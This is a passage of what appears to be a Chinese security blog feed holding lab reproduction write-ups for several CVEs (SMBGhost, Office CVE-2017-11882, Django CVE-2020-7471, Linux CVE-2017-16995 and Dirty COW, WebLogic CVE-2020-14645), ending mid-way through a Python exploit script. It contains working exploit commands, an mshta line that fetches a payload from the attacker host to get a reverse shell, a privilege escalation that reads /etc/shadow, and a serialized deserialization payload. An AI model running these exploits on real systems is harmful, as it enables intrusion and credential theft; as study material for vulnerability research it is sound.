href="https://github.com/chompie1337/SMBGhost_RCE_PoC">POC</a>，配置exploit.py</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">git clone https:<span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>chompie1337<span class="token operator">/</span>SMBGhost_RCE_PoC<span class="token punctuation">.</span>gitcd SMBGhost_RCE_PoC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>首先打开刚才使用msf生成的exploit.py，将每行最前面的<code>buf</code>替换成<code>USER_PAYLOAD</code>，然后全部复制，打开POC中的exploit.py，找到<code>USER_PAYLOAD</code>，替换为刚才复制的内容。</p><p>完成后，运行poc。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">python3 exploit<span class="token punctuation">.</span>py <span class="token operator">-</span>ip 靶机IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-msf攻击"><a href="#4-msf攻击" class="headerlink" title="4. msf攻击"></a>4. msf攻击</h3><p>启动msf监听本地端口，获得靶机权限，攻击成功。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msfconsoleuse exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler<span class="token function">set</span> payload windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcp<span class="token function">set</span>  rhost 靶机IPrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-11882漏洞复现</title>
      <link href="2020/10/07/cve-2017-11882-lou-dong-fu-xian/"/>
      <url>2020/10/07/cve-2017-11882-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>此漏洞是由Office软件里面的公式编辑器造成的，由于编辑器进程没有对名称长度进行校验，导致缓冲区溢出，攻击者通过构造特殊的字符，可以实现任意代码执行。</p><blockquote><p>这是我在实验室学习渗透测试所做的第十七个漏洞复现，用时约两小时。参考博客中给出的工具均已失效，只好自己寻找。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>office 2003</li><li>office 2007</li><li>office 2010</li><li>office 2013</li><li>office 2016</li></ul><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：Kali Linux   192.168.227.128</p><p>靶机：Windows 7   192.168.227.135, office 2016</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1-靶机安装office"><a href="#1-靶机安装office" class="headerlink" title="1. 靶机安装office"></a>1. 靶机安装office</h3><h3 id="2-攻击机下载poc"><a href="#2-攻击机下载poc" class="headerlink" title="2. 攻击机下载poc"></a>2. 攻击机下载<a target="_blank" rel="noopener" href="https://github.com/starnightcyber/CVE-2017-11882">poc</a></h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">git clone https:<span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>starnightcyber<span class="token operator">/</span>CVE<span class="token operator">-</span>2017<span class="token operator">-</span>11882<span class="token punctuation">.</span>git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-运行POC"><a href="#3-运行POC" class="headerlink" title="3. 运行POC"></a>3. 运行POC</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 弹出计算器</span>python Command_CVE<span class="token operator">-</span>2017<span class="token operator">-</span>11882<span class="token punctuation">.</span>py <span class="token operator">-</span>c <span class="token string">"cmd.exe /c calc.exe"</span> <span class="token operator">-</span>o test1<span class="token punctuation">.</span>doc<span class="token comment"># 弹出任务管理器</span>python Command_CVE<span class="token operator">-</span>2017<span class="token operator">-</span>11882<span class="token punctuation">.</span>py <span class="token operator">-</span>c <span class="token string">"cmd.exe /c taskmgr.exe"</span> <span class="token operator">-</span>o test2<span class="token punctuation">.</span>doc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到已经多了两个doc文件，将这两个doc文件复制到win7虚拟机，使用word 2016依次打开这两个文件，分别自动弹出了计算器和任务管理器。</p><h3 id="4-生成漏洞doc文件获取shell"><a href="#4-生成漏洞doc文件获取shell" class="headerlink" title="4. 生成漏洞doc文件获取shell"></a>4. 生成漏洞doc文件获取shell</h3><p>尽管msf5当中已有关于该漏洞的攻击模块，但我没太搞明白那个怎么用，所以就用了poc中提供的攻击模块。</p><p>将刚才git下来的文件PS-shell.rb重命名为CVE_2017_11882.rb，移动到/usr/share/metasploit-framework/modules/exploits/windows/smb目录下，然后打开msf，先使用<code>reload_all</code>命令重新加载所有模块，然后使用我们刚才加入的模块进行攻击。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msfconsolereload_alluse exploit<span class="token operator">/</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>CVE_2017_11882<span class="token function">set</span> payload windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token function">set</span> lhost 攻击机IP<span class="token function">set</span> uripath abcexploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在另一个终端中再次运行刚才的命令创建一个doc文件。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">python Command_CVE<span class="token operator">-</span>2017<span class="token operator">-</span>11882<span class="token punctuation">.</span>py <span class="token operator">-</span>c <span class="token string">"mshta http://192.168.227.128:8080/abc"</span> <span class="token operator">-</span>o test3<span class="token punctuation">.</span>doc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将创建后的test3.doc文件拷贝到靶机，或者靶机访问<code>httpL//攻击机IP:8080/abc/test3.doc</code>下载该文件。完成后打开，返回攻击机，可以看到已经获取到了session，攻击成功。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hi-blog/p/7878054.html">https://www.cnblogs.com/Hi-blog/p/7878054.html</a></li><li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/35248996">https://zhuanlan.zhihu.com/p/35248996</a></li><li><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 缓冲区溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-7471 Django SQL注入漏洞复现</title>
      <link href="2020/10/04/cve-2020-7471-lou-dong-fu-xian/"/>
      <url>2020/10/04/cve-2020-7471-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>2020年2月3日，Django 官方发布安全通告公布了一个通过StringAgg（分隔符）实现利用的潜在SQL注入漏洞（CVE-2020-7471）。攻击者可通过构造分隔符传递给聚合函数contrib.postgres.aggregates.StringAgg，从而绕过转义符号（\）并注入恶意SQL语句。</p><blockquote><p>这是我在实验室学习渗透测试所做的第十六个漏洞复现。</p></blockquote><h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><ul><li>Django 1.11.x &lt; 1.11.28</li><li>Django 2.2.x &lt; 2.2.10</li><li>Django 3.0.x &lt; 3.0.3</li></ul><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul><li>Kali Linux 2020.02</li><li>Django 3.0.2</li><li>postgresql 12.3</li></ul><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1-安装Django和postgres数据库"><a href="#1-安装Django和postgres数据库" class="headerlink" title="1. 安装Django和postgres数据库"></a>1. 安装Django和postgres数据库</h3><p>如果没有pip3，则先使用<code>apt-get install python3-pip</code>进行安装，然后使用<code>pip3 install Django==3.0.2</code>安装Django。Django受影响的版本主要有：</p><ul><li>Django 1.11.x &lt; 1.11.28</li><li>Django 2.2.x &lt; 2.2.10</li><li>Django 3.0.x &lt; 3.0.3</li></ul><p>安装好Django后，使用<code>apt-get install postgresql-11</code>安装postgres数据库。</p><h3 id="2-创建测试数据库"><a href="#2-创建测试数据库" class="headerlink" title="2. 创建测试数据库"></a>2. 创建测试数据库</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token operator">/</span>etc<span class="token operator">/</span>init<span class="token punctuation">.</span>d<span class="token operator">/</span>postgresql <span class="token function">start</span> <span class="token comment"># 开启数据库</span>lsof <span class="token operator">-</span>i:5432 <span class="token comment"># 查看状态</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开启后，连接数据库，修改postgres的密码为’123456’，并创建数据库test。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">sudo <span class="token operator">-</span>i <span class="token operator">-</span>u postgrespsql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">ALTER</span> <span class="token keyword">USER</span> postgres <span class="token keyword">WITH</span> PASSWORD <span class="token string">'123456'</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> test<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-安装POC并修改"><a href="#3-安装POC并修改" class="headerlink" title="3. 安装POC并修改"></a>3. 安装<a target="_blank" rel="noopener" href="https://github.com/Saferman/CVE-2020-7471">POC</a>并修改</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">git clone https:<span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Saferman<span class="token operator">/</span>CVE<span class="token operator">-</span>2020<span class="token operator">-</span>7471<span class="token punctuation">.</span>git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入POC内的sqlvul_project文件夹，打开settings.py，修改数据库的密码为刚才修改的‘123456’。</p><h3 id="4-初始化测试数据库test中的表"><a href="#4-初始化测试数据库test中的表" class="headerlink" title="4. 初始化测试数据库test中的表"></a>4. 初始化测试数据库test中的表</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">python3 manage<span class="token punctuation">.</span>py migratepython3 manage<span class="token punctuation">.</span>py makemigrations vul_apppython3 manage<span class="token punctuation">.</span>py migrate vul_app<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="5-运行POC"><a href="#5-运行POC" class="headerlink" title="5. 运行POC"></a>5. 运行POC</h3><p>在运行POC之前，先查看数据库，是没有数据的。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">\c test\d<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> vul_app_info<span class="token punctuation">;</span>\q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后运行POC：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">python3 CVE<span class="token operator">-</span>2020<span class="token operator">-</span>7471<span class="token punctuation">.</span>py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再次查看数据库，数据插入成功。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-16995漏洞复现</title>
      <link href="2020/10/03/cve-2017-16995-lou-dong-fu-xian/"/>
      <url>2020/10/03/cve-2017-16995-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>Ubuntu16.04存在本地提权漏洞，该漏洞存在于Linux内核带有的eBPF bpf(2)系统调用中，当用户提供恶意BPF程序使eBPF验证器模块产生计算错误，导致任意内存读写问题。攻击者（普通用户）可以利用该漏洞进行提权攻击，获取root权限，危害极大。</p><blockquote><p>这是我在实验室学习渗透测试所做的第十五个漏洞复现，非常简单。</p><p>这么久没有更新是因为前段时间感冒发烧，被带去隔离了，这两天才好了一点。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Linux内核：Linux Kernel Version 4.14 ~ 4.4<br>Ubuntu版本：16.04.01~ 16.04.04</p><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>Ubuntu 16.04.1 LTS</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1-查看内核与权限，下载POC"><a href="#1-查看内核与权限，下载POC" class="headerlink" title="1. 查看内核与权限，下载POC"></a>1. 查看内核与权限，下载<a href="https://link.zhihu.com/?target=http://cyseclabs.com/pub/upstream44.c">POC</a></h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">id <span class="token comment"># 查看本地用户组权限</span><span class="token function">cat</span> <span class="token operator">/</span>proc<span class="token operator">/</span>version <span class="token comment"># 查看Linux内核版本，漏洞存在于Linux Kernel Version 4.14~4.4，Ubuntu 16.04.1~16.04.04</span>wget http:<span class="token operator">/</span><span class="token operator">/</span>cyseclabs<span class="token punctuation">.</span>com<span class="token operator">/</span>pub<span class="token operator">/</span>upstream44<span class="token punctuation">.</span>c <span class="token comment"># 下载POC代码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-使用gcc编译POC"><a href="#2-使用gcc编译POC" class="headerlink" title="2. 使用gcc编译POC"></a>2. 使用gcc编译POC</h3><p>若未安装gcc，首先安装gcc，然后使用gcc对upstream44.c进行编译，并给予执行权限。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">gcc <span class="token operator">-</span>o test upstream44<span class="token punctuation">.</span>cchmod <span class="token operator">+</span>x test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-本地提权"><a href="#3-本地提权" class="headerlink" title="3. 本地提权"></a>3. 本地提权</h3><p>执行test文件，实现本地提权。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token punctuation">.</span><span class="token operator">/</span>testid<span class="token function">cat</span> <span class="token operator">/</span>etc<span class="token operator">/</span>shadow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到，当前用户已由原来的zxy变为了root，本地提权成功。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-5195漏洞复现</title>
      <link href="2020/09/25/cve-2016-5195-lou-dong-fu-xian/"/>
      <url>2020/09/25/cve-2016-5195-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>Linux内核的内存子系统在处理写和拷贝时存在条件竞争漏洞，导致可以破快破坏私有只读内存映射。一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的权限，实现本地提权。</p><blockquote><p>这是我在实验室学习渗透测试所做的第十四个漏洞复现，非常简单。</p></blockquote><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>Ubuntu 16.04.1 LTS</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1-安装clang-gcc"><a href="#1-安装clang-gcc" class="headerlink" title="1. 安装clang, gcc"></a>1. 安装clang, gcc</h3><p>不必严格按照POC说明中的版本进行安装，只要能成功复现即可。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">apt<span class="token operator">-</span>get install gccapt<span class="token operator">-</span>get install clang<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-运行poc"><a href="#2-运行poc" class="headerlink" title="2. 运行poc"></a>2. 运行poc</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">git clone https:<span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>gbonacini<span class="token operator">/</span>CVE<span class="token operator">-</span>2016<span class="token operator">-</span>5195<span class="token punctuation">.</span>gitcd CVE<span class="token operator">-</span>2016<span class="token operator">-</span>5195<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后输入<code>make</code>进行编译，编译成功后输入<code>./dcow -s</code>进行提权，提权成功。</p><p>注：该POC若第一次运行<code>./dcow</code>未加参数，也会显示成功，但第二次加上参数后则会失败，重启后可以成功。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-14645 Weblogic漏洞复现</title>
      <link href="2020/09/24/cve-2020-14645-lou-dong-fu-xian/"/>
      <url>2020/09/24/cve-2020-14645-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>该漏洞通过T3协议进行利用，攻击者可以实现远程代码执行，进而控制服务器。</p><blockquote><p>这是我在实验室学习渗透测试所做的第十三个漏洞复现，只要找好工具，就不算太难。</p></blockquote><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：Kali Linux 192.168.227.128</p><p>靶机：Windows 7 192.168.227.135</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="1-安装JDK"><a href="#1-安装JDK" class="headerlink" title="1. 安装JDK"></a>1. 安装JDK</h3><p>可选版本：</p><ul><li>6u211以下</li><li>7u201以下</li><li>8u191以下</li></ul><h3 id="2-安装WebLogic"><a href="#2-安装WebLogic" class="headerlink" title="2. 安装WebLogic"></a>2. 安装WebLogic</h3><p>可选版本：</p><ul><li>Oracle WebLogic Server 10.3.6.0.0</li><li>Oracle WebLogic Server 12.2.1.4.0</li><li>Oracle WebLogic Server 12.2.1.3.0</li><li>Oracle WebLogic Server 12.1.3.0.0</li><li>Oracle WebLogic Server 14.1.1.0.0</li></ul><p>下载完成后提取zip文件，用管理员权限打开cmd，切换到提取后的目录，运行jar文件。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">java <span class="token operator">-</span>jar fmw_12<span class="token punctuation">.</span>2<span class="token punctuation">.</span>1<span class="token punctuation">.</span>4<span class="token punctuation">.</span>0_wls_lite_generic<span class="token punctuation">.</span>jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装程序执行，全部点击下一步直到安装完成，自动打开配置向导。创建新域并勾选所有模板，点击下一步直到安装完成。</p><p>完成后，cmd中切换到<code>C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain</code>目录下，运行startWebLogic.cmd。等待一段时间，程序会停下来，此时打开浏览器，访问<code>http://Your IP:7001/console/login/LoginForm.jsp</code>，等待几秒钟，若界面变为下图所示模样，说明环境部署成功。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="1-安装marshalsec"><a href="#1-安装marshalsec" class="headerlink" title="1. 安装marshalsec"></a>1. 安装<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec</a></h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">git clone https:<span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>mbechler<span class="token operator">/</span>marshalsec<span class="token punctuation">.</span>gitcd marshalsecmvn clean package <span class="token operator">-</span>DskipTests<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>等待编译完成，开启ldap服务。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">java <span class="token operator">-</span><span class="token function">cp</span> target<span class="token operator">/</span>marshalsec<span class="token operator">-</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1<span class="token operator">-</span>SNAPSHOT<span class="token operator">-</span>all<span class="token punctuation">.</span>jar marshalsec<span class="token punctuation">.</span>&lt;Marshaller&gt; <span class="token punctuation">[</span><span class="token operator">-</span>a<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>v<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>t<span class="token punctuation">]</span> <span class="token punctuation">[</span>&lt;gadget_type&gt; <span class="token punctuation">[</span>&lt;arguments<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>&gt;<span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-python开启web服务"><a href="#2-python开启web服务" class="headerlink" title="2. python开启web服务"></a>2. python开启web服务</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">python3 <span class="token operator">-</span>m http<span class="token punctuation">.</span>server 998<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-编译exp-java"><a href="#3-编译exp-java" class="headerlink" title="3. 编译exp.java"></a>3. 编译exp.java</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Runtime</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Process</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> exp <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">Runtime</span> rt <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"calc.exe"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>            <span class="token class-name">Process</span> pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// do nothing</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将上面的JAVA代码写入exp.java，然后编译成class文件。两个文件均放在python开启的web服务根目录下。</p><h3 id="4-运行POC"><a href="#4-运行POC" class="headerlink" title="4. 运行POC"></a>4. 运行POC</h3><p>poc内容如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># _*_ coding:utf-8 _*_</span><span class="token keyword">import</span> binascii<span class="token keyword">import</span> socket<span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">import</span> logging<span class="token comment"># CVE-2020-14645</span><span class="token keyword">def</span> <span class="token function">payload</span><span class="token punctuation">(</span>ldap<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload_start <span class="token operator">=</span> <span class="token string">'aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b78700000000273720030636f6d2e74616e676f736f6c2e7574696c2e636f6d70617261746f722e457874726163746f72436f6d70617261746f72f9b3bc58cc52cd210200014c000b6d5f657874726163746f727400224c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b78707372002e636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e556e6976657273616c457874726163746f720dc477bfff4bf18c0200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00076d5f734e616d657400124c6a6176612f6c616e672f537472696e673b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f729b1be18ed70100e50200014900096d5f6e5461726765747870000000017074001567657444617461626173654d6574614461746128297704000000037372001d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706cce26d81f4973c2050200074c0004636f6e6e7400154c6a6176612f73716c2f436f6e6e656374696f6e3b4c000d694d61746368436f6c756d6e737400124c6a6176612f7574696c2f566563746f723b4c0002707374001c4c6a6176612f73716c2f507265706172656453746174656d656e743b4c00057265734d4474001c4c6a6176612f73716c2f526573756c745365744d657461446174613b4c0006726f77734d447400254c6a617661782f73716c2f726f777365742f526f775365744d65746144617461496d706c3b4c000272737400144c6a6176612f73716c2f526573756c745365743b4c000f7374724d61746368436f6c756d6e7371007e000e7872001b6a617661782e73716c2e726f777365742e42617365526f7753657443d11da54dc2b1e002001549000b636f6e63757272656e63795a001065736361706550726f63657373696e674900086665746368446972490009666574636853697a6549000969736f6c6174696f6e49000c6d61784669656c6453697a654900076d6178526f777349000c717565727954696d656f75745a0008726561644f6e6c7949000a726f77536574547970655a000b73686f7744656c657465644c000355524c71007e00084c000b617363696953747265616d7400154c6a6176612f696f2f496e70757453747265616d3b4c000c62696e61727953747265616d71007e00144c000a6368617253747265616d7400104c6a6176612f696f2f5265616465723b4c0007636f6d6d616e6471007e00084c000a64617461536f7572636571007e00084c00096c697374656e65727371007e000e4c00036d617074000f4c6a6176612f7574696c2f4d61703b4c0006706172616d737400154c6a6176612f7574696c2f486173687461626c653b4c000d756e69636f646553747265616d71007e00147870000003f001000003e8000000000000000200000000000000000000000001000003ec00707070707074'</span>    payload_lenhex <span class="token operator">=</span> <span class="token string">'00'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ldap<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>    payload_ldaphex <span class="token operator">=</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>ldap<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    payload_end <span class="token operator">=</span> <span class="token string">'737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e744461746171007e000778700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a707070707070707070707870737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000007870707371007e001a000000000000000a7571007e001c0000000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870ffffffff71007e002471007e002471007e002471007e002471007e002471007e002471007e002471007e002471007e002478707070707371007e001a000000000000000a7571007e001c0000000a707070707070707070707871007e001878'</span>    payload <span class="token operator">=</span> payload_start <span class="token operator">+</span> payload_lenhex <span class="token operator">+</span> payload_ldaphex<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload_end    <span class="token keyword">return</span> payload<span class="token keyword">def</span> <span class="token function">t3handshake</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>server_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>server_addr<span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buildT3RequestObject</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>rport<span class="token punctuation">)</span><span class="token punctuation">:</span>    data1 <span class="token operator">=</span> <span class="token 